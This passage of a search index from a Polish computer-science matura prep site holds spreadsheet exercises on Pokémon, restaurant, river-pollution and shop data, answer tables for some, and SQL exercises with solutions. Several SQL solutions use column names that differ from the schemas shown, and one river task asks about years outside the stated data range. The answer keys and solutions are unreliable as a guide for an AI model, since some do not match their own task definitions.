Wild Switch 2018 Red Dead Redemption 2 Xbox One 2020 Persona 5 Royal PlayStation 4 2021 Disco Elysium: The Final Cut PC 2022 Portal Companion   Collection Switch 2023 Metroid Prime Remastered Switch"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/answers/#zadanie-7","title":"Zadanie 7","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/games/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/","title":"Pokemony","text":"<p>W pliku Pokemony.txt znajduj\u0105 si\u0119 informacje na temat \\(800\\) pokemon\u00f3w. Ka\u017cda linia zawiera nast\u0119puj\u0105ce informacje:</p> <ul> <li>nazw\u0119 pokemona,</li> <li>pierwszy typ,</li> <li>drugi typ, je\u017celi posiada,</li> <li>punkty \u017cycia,</li> <li>si\u0142a ataku,</li> <li>si\u0142a obrony,</li> <li>si\u0142a ataku specjalnego,</li> <li>si\u0142a obrony specjalnej,</li> <li>czy pokemon jest legendarny (1 - tak, 0 - nie).</li> </ul> <p>Dane oddzielone s\u0105 znakiem tabulacji. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> Pokemony.txt</p> <p>\u0179r\u00f3d\u0142o danych: https://www.kaggle.com/datasets/abcsds/pokemon</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/#zadanie-1","title":"Zadanie 1","text":"<p>Dla ka\u017cdej generacji policz:</p> <ul> <li>liczb\u0119 pokemon\u00f3w,</li> <li>najwi\u0119kszy atak,</li> <li>najmniejszy atak,</li> <li>\u015bredni atak,</li> <li>najwi\u0119ksz\u0105 warto\u015b\u0107 r\u00f3\u017cnicy bezwgl\u0119dnej pomi\u0119dzy atakiem a obron\u0105,</li> <li>liczb\u0119 pokemon\u00f3w, kt\u00f3re maj\u0105 podane dwa typy,</li> <li>liczb\u0119 legendarnych pokemon\u00f3w.</li> </ul> <p>Wyniki przedstaw na wykresie/wykresach. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego typu policz, z podzia\u0142em na generacje, liczb\u0119 pokemon\u00f3w, kt\u00f3re posiadaj\u0105 ten typ jako pierwszy lub drugi. Wyniki przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej litery alfabetu angielskiego policz liczb\u0119 pokemon\u00f3w, kt\u00f3rych nazwa zaczyna si\u0119 od tej litery. Wyniki przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/#zadanie-4","title":"Zadanie 4","text":"<p>Przedstaw na wykresie ko\u0142owym udzia\u0142 procentowy ka\u017cdego typu w zestawieniu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/#zadanie-5","title":"Zadanie 5","text":"<p>Policz, ile pokemon\u00f3w nie ma zdefiniowanego drugiego typu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/#zadanie-6","title":"Zadanie 6","text":"<p>Policz median\u0119 szybko\u015bci dla ka\u017cdej generacji.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/#zadanie-7","title":"Zadanie 7","text":"<p>Policz, ile pokemon\u00f3w ma atak w zakresie:</p> <ul> <li>\\([0, 49]\\)</li> <li>\\([50, 99]\\)</li> <li>\\([100, 149]\\)</li> <li>\\([150, 200]\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/pokemons/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/","title":"Restauracja","text":"<p>W pliku restaurant.txt znajduj\u0105 si\u0119 dane o zam\u00f3wieniach pewnej restauracji z 2023 roku. Restauracja jest otwierana ka\u017cdego dnia o 10:00:00, a zamykana o 00:00:00. Ka\u017cda linia zawiera dane jednego zam\u00f3wienia:</p> <ul> <li>numer stolika: liczba naturalna od 1 do 10</li> <li>kwota zam\u00f3wienia: liczba rzeczywista z dok\u0142adno\u015bci\u0105 do 2 miejsc po przecinku</li> <li>rodzaj zam\u00f3wienia: liczba naturalna od 1 do 31 opisana poni\u017cej</li> <li>data zam\u00f3wienia</li> <li>czas zam\u00f3wienia</li> </ul> <p>Dane s\u0105 rodzielone \u015brednikami. Pierwszy wiersz pliku zawiera nazwy kolumn.</p> <p> restaurant.txt</p> <p>Rodzaj zam\u00f3wienia zakodowany jest za pomoc\u0105 liczby naturalnej. Zapis binarny tej liczby na 5 bitach zawiera informacje o tym, co zosta\u0142o zam\u00f3wione. Jedynka na danym miejscu oznacza, \u017ce zosta\u0142a zam\u00f3wiona pozycja z menu odpowiadaj\u0105ca danemu miejscu. Id\u0105c od bitu najmniej znacz\u0105cego, kolejne pozycje odpowiadaj\u0105 nast\u0119puj\u0105cym kategoriom:</p> <ul> <li>nap\u00f3j ciep\u0142y</li> <li>nap\u00f3j zimny</li> <li>przystawka</li> <li>danie g\u0142\u00f3wne</li> <li>deser</li> </ul> <p>Info</p> <p>Przyk\u0142ad</p> <p>Liczba \\(10\\) zapisana na pi\u0119ciu bitach to: \\(01001\\)</p> <p>Co oznacza to, \u017ce zosta\u0142y zam\u00f3wione:</p> <ul> <li>pozycja 1 (nap\u00f3j ciep\u0142y)</li> <li>pozycja 4 (danie g\u0142\u00f3wne)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/#zadanie-1","title":"Zadanie 1","text":"<p>Policz ile \u0142\u0105cznie zosta\u0142o zam\u00f3wionych da\u0144 z poszczeg\u00f3lnych kategorii (nap\u00f3j ciep\u0142y, nap\u00f3j zimny, przystawka, danie g\u0142\u00f3wne, deser).</p> <p>Dla pierwszych 100 wierszy wynik to:</p> Rodzaj Nap\u00f3j ciep\u0142y Nap\u00f3j zimny Przystawka Danie g\u0142\u00f3wne Deser Liczba zam\u00f3wie\u0144 \\(49\\) \\(59\\) \\(48\\) \\(56\\) \\(50\\)"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/#zadanie-2","title":"Zadanie 2","text":"<p>Znajd\u017a, kt\u00f3re godziny s\u0105 najbardziej popularne w\u015br\u00f3d klient\u00f3w, analizuj\u0105c czas zam\u00f3wie\u0144. Wykonaj wykres prezentuj\u0105cy liczby zam\u00f3wie\u0144 dokonanych w ka\u017cdej godzinie.</p> <p>O godzinie 10 z\u0142o\u017conych zosta\u0142o 80 zam\u00f3wie\u0144.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/#zadanie-3","title":"Zadanie 3","text":"<p>Oblicz, ile zam\u00f3wie\u0144 zosta\u0142o dokonanych w weekend (sobota-niedziela), a ile w dni robocze.</p> <p>Dla pierwszych 10 zam\u00f3wie\u0144 z pliku, cztery zosta\u0142y dokonane w weekend.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/#zadanie-4","title":"Zadanie 4","text":"<p>Dla ka\u017cdego miesi\u0105ca policz liczb\u0119 zam\u00f3wie\u0144 w nast\u0119puj\u0105cych przedzia\u0142ach cenowych: poni\u017cej 50,00 z\u0142, od 50,00 do 100,00 z\u0142, od 100,01 do 150,00 z\u0142 i powy\u017cej 150,00 z\u0142. Dane przedstaw na wykresie.</p> <p>Wynik dla stycznia:</p> Miesi\u0105c Liczba zam\u00f3wie\u0144 poni\u017cej 50,00 z\u0142 Liczba zam\u00f3wie\u0144 od 50,00 do   100,00 z\u0142 Liczba zam\u00f3wie\u0144 od 100,01 do   150,00 z\u0142 Liczba zam\u00f3wie\u0144 powy\u017cej 150,00   z\u0142 stycze\u0144 \\(20\\) \\(19\\) \\(16\\) \\(17\\)"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/#zadanie-5","title":"Zadanie 5","text":"<p>Zbadaj, kt\u00f3re kombinacje zam\u00f3wie\u0144 (np. nap\u00f3j ciep\u0142y + danie g\u0142\u00f3wne, przystawka + deser) s\u0105 najpopularniejsze, tzn. by\u0142y najcz\u0119\u015bciej zamawiane. Je\u017celi jest kilka takich kombinacji, to podaj wszystkie.</p> <p>Najmniej popularne zam\u00f3wienie sk\u0142ada\u0142o si\u0119 z samego napoju ciep\u0142ego.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/#zadanie-6","title":"Zadanie 6","text":"<p>Klienci restauracji zwyczajowo zostawiaj\u0105 napiwki po ka\u017cdym zam\u00f3wieniu. Wysoko\u015b\u0107 napiwk\u00f3w zale\u017cy od z\u0142o\u017conego zam\u00f3wienia:</p> <ul> <li>je\u017celi zam\u00f3wienie zawiera\u0142o danie g\u0142\u00f3wne, przystawk\u0119 oraz deser, to napiwki wynosz\u0105 20% z kwoty zam\u00f3wienia,</li> <li>je\u017celi zam\u00f3wienie zawiera\u0142o dok\u0142adnie dwie z nast\u0119puj\u0105cych pozycji: danie g\u0142\u00f3wne, przystawk\u0119, deser (nap\u00f3j nie ma znaczenia), to napiwki wynosz\u0105 10% z kwoty zam\u00f3wienia,</li> <li>je\u017celi zam\u00f3wienie zawiera\u0142o dok\u0142adnie jedno z nast\u0119puj\u0105cych pozycji: danie g\u0142\u00f3wne, przystawk\u0119, deser (nap\u00f3j nie ma znaczenia), to napiwki wynosz\u0105 5% z kwoty zam\u00f3wienia,</li> <li>je\u017celi zam\u00f3wienie zawiera\u0142o jedynie nap\u00f3j, to napiwki wynosz\u0105 2% z kwoty zam\u00f3wienia.</li> </ul> <p>Napiwki s\u0105 zawsze zaokr\u0105glane w g\u00f3r\u0119 do pe\u0142nych groszy.</p> <p>Oblicz wysoko\u015b\u0107 napiwk\u00f3w dla ka\u017cdego miesi\u0105ca z podzia\u0142em na stoliki.</p> <p>W styczniu wysoko\u015b\u0107 napiwk\u00f3w ze stolika pierwszego wynosi\u0142a \\(24,14\\) z\u0142otych.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/#zadanie-7","title":"Zadanie 7","text":"<p>W\u0142a\u015bciciel restauracji postanawia wprowadzi\u0107 nast\u0119puj\u0105c\u0105 promocj\u0119: ka\u017cde zam\u00f3wienie sk\u0142adaj\u0105ce si\u0119 z conajmniej dw\u00f3ch pozycji (danie g\u0142\u00f3wne, przystawka, deser) b\u0119dzie obj\u0119te zni\u017ck\u0105 wynosz\u0105c\u0105 15% kwoty ca\u0142ego zam\u00f3wienia (zaokr\u0105glonej w d\u00f3\u0142 do pe\u0142nych groszy). Promocja nie ma trwa\u0107 jednak ca\u0142y dzie\u0144, a w wybranych dw\u00f3ch pe\u0142nych godzinach w ci\u0105gu dnia. Przeprowad\u017a analiz\u0119, o ile mniejsze by\u0142yby przychody restauracji po wprowadzeniu tej promocji dla ka\u017cdego przedzia\u0142u dwugodzinnego w ci\u0105gu dnia w godzinach dzia\u0142ania restauracji, tzn. od 10:00:00 do 11:59:59, od 11:00:00 do 12:59:59 itd. a\u017c do przedzia\u0142u od 22:00:00 do 23:59:59.</p> <p>Wyniki przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p> <p>W przedziale godzinowym od 10:00:00 do 11:59:59 sumy przychody restauracji by\u0142yby mniejsze o \\(1210,14\\) z\u0142.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/#zadanie-1","title":"Zadanie 1","text":"Rodzaj Nap\u00f3j ciep\u0142y Nap\u00f3j zimny Przystawka Danie g\u0142\u00f3wne Deser Liczba zam\u00f3wie\u0144 \\(530\\) \\(528\\) \\(516\\) \\(519\\) \\(498\\)"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/#zadanie-2","title":"Zadanie 2","text":"Godzina Liczba zam\u00f3wie\u0144 10 80 11 82 12 70 13 74 14 65 15 83 16 80 17 78 18 75 19 69 20 73 21 83 22 83 23 5"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/#zadanie-3","title":"Zadanie 3","text":"Typ dnia Liczba zam\u00f3wie\u0144 dzie\u0144 roboczy 707 weekend 293"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/#zadanie-4","title":"Zadanie 4","text":"Miesi\u0105c Liczba zam\u00f3wie\u0144 poni\u017cej 50,00 z\u0142 Liczba zam\u00f3wie\u0144 od 50,00 do   100,00 z\u0142 Liczba zam\u00f3wie\u0144 od 100,01 do   150,00 z\u0142 Liczba zam\u00f3wie\u0144 powy\u017cej 150,00   z\u0142 sty 20 19 16 17 lut 19 24 21 27 mar 16 26 26 26 kwi 26 18 16 19 maj 23 20 23 13 cze 25 23 17 18 lip 23 28 24 27 sie 23 25 28 15 wrz 18 16 18 19 pa\u017a 19 21 26 19 lis 15 10 23 20 gru 19 20 28 18"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/#zadanie-5","title":"Zadanie 5","text":"<p>Nap\u00f3j ciep\u0142y + nap\u00f3j zimny + przystawka + danie g\u0142\u00f3wne (42 zam\u00f3wienia).</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/#zadanie-6","title":"Zadanie 6","text":"Suma napiwk\u00f3w Numer stolika Miesi\u0105c 1 2 3 4 5 6 7 8 9 10 sty 24,14 72,93 76,89 46,44 58,66 47,15 38,12 53,23 57,95 80,16 lut 96,06 99,98 59,36 80,44 26,44 81,16 66,86 78,67 175,93 45,43 mar 73,32 195,93 76,88 49,74 77,77 83,63 138,64 35,76 55,75 59,63 kwi 40,8 83,52 74,84 39,06 41,43 22,62 40,57 53,4 77,89 77,69 maj 75,28 72,02 140,6 37,51 21,66 83,9 53,64 50,53 23,14 73,42 cze 56,68 85,64 67,34 65,34 59,77 95,96 32,02 19,08 41,24 77,64 lip 62,18 100,05 104,63 64,69 134,25 163,43 42,2 113,26 62,69 29,48 sie 105,1 126,69 68,2 66,98 14,13 109,58 69,33 41,31 73,85 64,76 wrz 49,97 45,91 96,31 22,07 53,08 100,85 92,11 31,03 28,45 60,86 pa\u017a 51,26 83,16 138,77 54,72 36,4 62,55 60,05 65,65 102,07 52,48 lis 88,03 43,26 51,47 34,69 78,79 72,69 79,77 59,93 77,2 127,03 gru 111,52 143,03 28,86 36,04 71,05 99,19 19,88 68,87 102,03 90,05"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/restaurant/answers/#zadanie-7","title":"Zadanie 7","text":"Przedzia\u0142   godzinowy Suma kwoty promocji 10-12 1210,14 11-13 1248,02 12-14 1045,61 13-15 991,57 14-16 1116,01 15-17 1248,68 16-18 1039,57 17-19 957,41 18-20 1126,51 19-21 1142,31 20-22 1211,04 21-23 1226,55 22-00 658,6"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/","title":"Rzeka","text":"<p>W pliku Rzeka.txt znajduj\u0105 si\u0119 dane odczyt\u00f3w zanieczyszczenia rzeki Bug na terenie Ukrainy w latach 1996-2019. Ka\u017cda linia zawiera nast\u0119puj\u0105ce informacje:</p> <ul> <li>identyfikator stacji wykonuj\u0105cej odczyt,</li> <li>data odczytu,</li> <li>warto\u015b\u0107 odczytu,</li> <li>odleg\u0142o\u015b\u0107 stacji od \u017ar\u00f3d\u0142a rzeki.</li> </ul> <p>Dane oddzielone s\u0105 \u015brednikami. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> Rzeka.txt</p> <p>\u0179r\u00f3d\u0142o danych: https://www.kaggle.com/datasets/vbmokin/ammonium-prediction-in-river-water</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/#zadanie-1","title":"Zadanie 1","text":"<p>Dla ka\u017cdej stacji oblicz minimalny, maksymalny i \u015bredni odczyt dla ka\u017cdego roku, w kt\u00f3rym by\u0142y dokonywane pomiary z tej stacji,</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdej odleg\u0142o\u015bci stacji od \u017ar\u00f3d\u0142a rzeki oblicz \u015bredni odczyt oraz odchylenie standardowe odczytu. Wyniki zaokr\u0105glij do trzech miejsc po przecinku i przedstaw na wykresie liniowym. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej stacji podaj dat\u0119 i warto\u015b\u0107 pierwszego i ostatniego (pod wzgl\u0119dem daty) odczytu, a nast\u0119pnie oblicz warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy pomi\u0119dzy tymi odczytami. Wyniki obliczonej r\u00f3\u017cnicy dla ka\u017cdej stacji przedstaw na wykresie kolumnowym. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/#zadanie-4","title":"Zadanie 4","text":"<p>Przedstaw na wykresie ko\u0142owym procentowy udzia\u0142 ka\u017cdej stacji w odczytach zawartych w zestawieniu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/#zadanie-5","title":"Zadanie 5","text":"<p>Dla ka\u017cdej stacji oblicz warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy pomi\u0119dzy maksymalnym a minimalnych odczytem z tej stacji. Wyniki zaokr\u0105glij do dw\u00f3ch miejsc po przecinku i przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/#zadanie-6","title":"Zadanie 6","text":"<p>Dla ka\u017cdej daty odczytu (dokonanego z dowolnej stacji) oblicz \u015bredni odczyt dokonany tego dnia. Wyniki uporz\u0105dkuj rosn\u0105co po dacie. Nast\u0119pnie, poczynaj\u0105c od drugiego odczytu, oblicz r\u00f3\u017cnice pomi\u0119dzy kolejnymi odczytami, tzn. odczyt z obecnego dnia minus poprzedni odczyt. Warto\u015bci r\u00f3\u017cnic odczyt\u00f3w z lat 1993-1994 przedstaw na wykresie liniowym. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/#zadanie-7","title":"Zadanie 7","text":"<p>Ignoruj\u0105c powt\u00f3rzenia odczyt\u00f3w z tego samego dnia, oblicz odst\u0119p w dniach pomi\u0119dzy kolejnymi odczytami (bez wzgl\u0119du na stacj\u0119, z kt\u00f3rej dokonano pomiaru). Dla pierwszego dokonanego odczytu przyjmij warto\u015b\u0107 zero jako odst\u0119p w dniach. </p> <p>Podaj maksymaln\u0105 liczb\u0119 dni pomi\u0119dzy kolejnymi odczytami (jest tylko jedna taka warto\u015b\u0107), a tak\u017ce daty tych odczyt\u00f3w.</p> <p>Dla ka\u017cdego odst\u0119pu w dniach wyst\u0119puj\u0105cego w wynikach policz, ile razy taki odst\u0119p wyst\u0105pi\u0142. Dane uporz\u0105dkuj rosn\u0105co po liczbie dni i przedstaw na wykresie. Zadbaj o czytelno\u015b\u0107 wykresu.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/river/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/","title":"Sklep","text":"<p>Pewien sklep mia\u0142 w dniu 31.08.2018r. 2000z\u0142 utargu. Oblicz utarg dla ka\u017cdego dnia od pocz\u0105tku wrze\u015bnia 2018r. do ko\u0144ca grudnia tego roku, przy nast\u0119puj\u0105cych za\u0142o\u017ceniach:</p> <ul> <li>Ka\u017cdego dnia parzystego (gdy dzie\u0144 miesi\u0105ca jest liczb\u0105 parzyst\u0105) utarg jest o 20% wi\u0119kszy ni\u017c dnia poprzedniego, a dnia nieparzystego jest tylko 10% wi\u0119kszy.</li> <li>Ka\u017cdej niedzieli utarg jest dwa razy mniejszy ni\u017c dnia poprzedniego (bez wzgl\u0119du na parzysto\u015b\u0107 daty).</li> <li>Ka\u017cdego pierwszego dnia miesi\u0105ca (poza 01.09.2018) utarg stanowi \u015bredni utarg z poprzedniego miesi\u0105ca.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/#zadanie-1","title":"Zadanie 1","text":"<p>Jaki jest maksymalny utarg sklepu, i kiedy mia\u0142 miejsce?</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/#zadanie-2","title":"Zadanie 2","text":"<p>Oblicz minimalny i maksymalny utarg dla ka\u017cdego miesi\u0105ca od wrze\u015bnia do grudnia. Wykonaj czytelny wykres pokazuj\u0105cy te warto\u015bci.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/#zadanie-3","title":"Zadanie 3","text":"<p>Wykonaj wykres pokazuj\u0105cy utarg w ka\u017cd\u0105 niedziel\u0119 w podanym okresie.</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/answers/#zadanie-1","title":"Zadanie 1","text":"<p>Maksymalny utarg:   \\(8 709,96\\) z\u0142</p> <p>Dzie\u0144:  \\(29.12.2018\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/answers/#zadanie-2","title":"Zadanie 2","text":"Miesi\u0105c Minimalny utarg Maksymalny utarg wrz \\(1 100,00\\) z\u0142 \\(3 847,60\\) z\u0142 pa\u017a \\(2 160,25\\) z\u0142 \\(6 869,24\\) z\u0142 lis \\(2 621,05\\) z\u0142 \\(8 334,52\\) z\u0142 gru \\(2 490,11\\) z\u0142 \\(8 709,96\\) z\u0142"},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/answers/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/przygotowanie/spreadsheet/shop/solution/","title":"Rozwi\u0105zanie","text":"<p> Rozwi\u0105zanie</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/","title":"Komandosi","text":"<p>Rozwa\u017cmy nast\u0119puj\u0105c\u0105 baz\u0119 danych:</p> <pre><code>erDiagram\n    Misje }o--|| Komandosi : \"\"\n    KomandosiNaMisji }o--|| Komandosi : \"\"\n    KomandosiNaMisji }o--|| Misje : \"\"\n    UmiejetnosciKomandosow }o--|| Komandosi : \"\"\n    UmiejetnosciKomandosow }o--|| UmiejetnosciSpecjalne : \"\"\n\n    Komandosi {\n        INTEGER id PK\n        TEXT imie\n        TEXT nazwisko\n        TEXT stopien\n    }\n    Misje {\n        INTEGER id PK\n        TEXT nazwa\n        INTEGER numer_dowodcy FK\n        INTEGER liczba_dni_misji\n        DATE data_misji\n    }\n    KomandosiNaMisji {\n        INTEGER numer_komandosa FK\n        INTEGER numer_misji FK\n    }\n    UmiejetnosciSpecjalne {\n        INTEGER id PK\n        TEXT nazwa\n    }\n    UmiejetnosciKomandosow {\n        INTEGER numer_komandosa FK\n        INTEGER numer_umiejetnosci FK\n    }</code></pre> <p>Podaj instrukcje SQL realizuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/#zadanie-1","title":"Zadanie 1","text":"<p>Wypisz imi\u0119 i nazwisko ka\u017cdego porucznika.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/#zadanie-2","title":"Zadanie 2","text":"<p>Policz, ile misji odby\u0142o si\u0119 w maju.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/#zadanie-3","title":"Zadanie 3","text":"<p>Wypisz imi\u0119 i nazwisko ka\u017cdego komandosa, kt\u00f3ry by\u0142 dow\u00f3dc\u0105 na misji. Posortuj po nazwisku i imieniu.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/#zadanie-4","title":"Zadanie 4","text":"<p>Dla ka\u017cdego komandosa wypisz jego umiej\u0119tno\u015bci specjalne.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/#zadanie-5","title":"Zadanie 5","text":"<p>Dla ka\u017cdej misji policz, ilu komandos\u00f3w bra\u0142o w niej udzia\u0142.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/#zadanie-6","title":"Zadanie 6","text":"<p>Dla ka\u017cdego komandosa wypisz, ile \u0142\u0105cznie sp\u0119dzi\u0142 dni na misjach.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/#zadanie-7","title":"Zadanie 7","text":"<p>Dla ka\u017cdej misji wypisz, ilu saper\u00f3w bra\u0142o w niej udzia\u0142.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/","title":"Rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/#zadanie-1","title":"Zadanie 1","text":"<pre><code>SELECT imie, nazwisko \n    FROM Komandosi \n    WHERE stopien = \"Porucznik\";\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/#zadanie-2","title":"Zadanie 2","text":"<pre><code>SELECT COUNT(*) \n    FROM Misje \n    WHERE datamisji LIKE '%-05-%';\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/#zadanie-3","title":"Zadanie 3","text":"<pre><code>SELECT imie, nazwisko \n    FROM Misje \n        Join Komandosi ON numerdowodcy=Komandosi.id;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/#zadanie-4","title":"Zadanie 4","text":"<pre><code>SELECT imie, nazwisko, nazwa \n    FROM Komandosi \n        JOIN UmiejetnosciKomandosow ON Komandosi.id = UmiejetnosciKomandosow.NumerKomandosa\n        JOIN UmiejetnosciSpecjalne ON UmiejetnosciSpecjalne.id = UmiejetnosciKomandosow.NumerUmiejetnosci;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/#zadanie-5","title":"Zadanie 5","text":"<pre><code>SELECT nazwa, datamisji, count(Komandosi.id) \n    FROM Misje\n        JOIN KomandosiNaMisji ON Misje.id = KomandosiNaMisji.NumerMisji\n        JOIN Komandosi ON Komandosi.id = KomandosiNaMisji.NumerKomandosa\n    GROUP BY Misje.id;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/#zadanie-6","title":"Zadanie 6","text":"<pre><code>SELECT imie, nazwisko, SUM(Misje.iloscdnimisji) \n    FROM Misje\n        JOIN KomandosiNaMisji ON Misje.id = KomandosiNaMisji.NumerMisji\n        JOIN Komandosi ON Komandosi.id = KomandosiNaMisji.NumerKomandosa\n    GROUP BY Komandosi.id;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/commandos/solution/#zadanie-7","title":"Zadanie 7","text":"<pre><code>SELECT Misje.nazwa, COUNT(UmiejetnosciSpecjalne.id) \n    FROM Komandosi \n        JOIN KomandosiNaMisji ON Komandosi.id = KomandosiNaMisji.NumerKomandosa\n        JOIN Misje ON KomandosiNaMisji.NumerMisji = Misje.id \n        JOIN UmiejetnosciKomandosow ON UmiejetnosciKomandosow.NumerKomandosa = Komandosi.id\n        JOIN UmiejetnosciSpecjalne ON UmiejetnosciKomandosow.NumerUmiejetnosci = UmiejetnosciSpecjalne.id \n    WHERE UmiejetnosciSpecjalne.nazwa = \"Saper\"\n    GROUP BY Misje.id;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/","title":"Sklep","text":"<p>Rozwa\u017cmy nast\u0119puj\u0105c\u0105 baz\u0119 danych:</p> <pre><code>erDiagram\n    Zamowienia }o--|| Artykuly : \"\"\n    Zamowienia }o--|| Klienci : \"\"\n    Artykuly {\n        INTEGER id_art PK\n        TEXT nazwa\n        REAL cena\n    }\n    Klienci {\n        INTEGER id_kl PK\n        TEXT imie\n        TEXT nazwisko\n        TEXT miasto\n        TEXT ulica\n        TEXT kod_pocztowy\n    }\n    Zamowienia {\n        INTEGER id_zam PK\n        INTEGER id_art FK\n        INTEGER id_kl FK\n        INTEGER liczba_sztuk\n        DATE data_zam\n    }</code></pre> <p>Tabela Zamowienia zawiera histori\u0119 wszystkich z\u0142o\u017conych zam\u00f3wie\u0144 na artyku\u0142y.</p> <p>Podaj instrukcje SQL realizuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj dane wszystkich zam\u00f3wie\u0144, kt\u00f3re zosta\u0142y dokonane w maju 2015 roku.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj wszystkie imiona klient\u00f3w ko\u0144cz\u0105ce si\u0119 na liter\u0119 \u2018a\u2019.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj identyfikator, imi\u0119 i nazwisko ka\u017cdego klienta, kt\u00f3ry 18 marca 2016 roku dokona\u0142 co najmniej jednego zakupu.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-4","title":"Zadanie 4","text":"<p>Dla ka\u017cdego klienta podaj jego identyfikator, imi\u0119, nazwisko i sumaryczny koszt wszystkich jego zam\u00f3wie\u0144. Dane posortuj alfabetycznie po nazwisku.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-5","title":"Zadanie 5","text":"<p>Podaj identyfikator, imi\u0119 i nazwisko 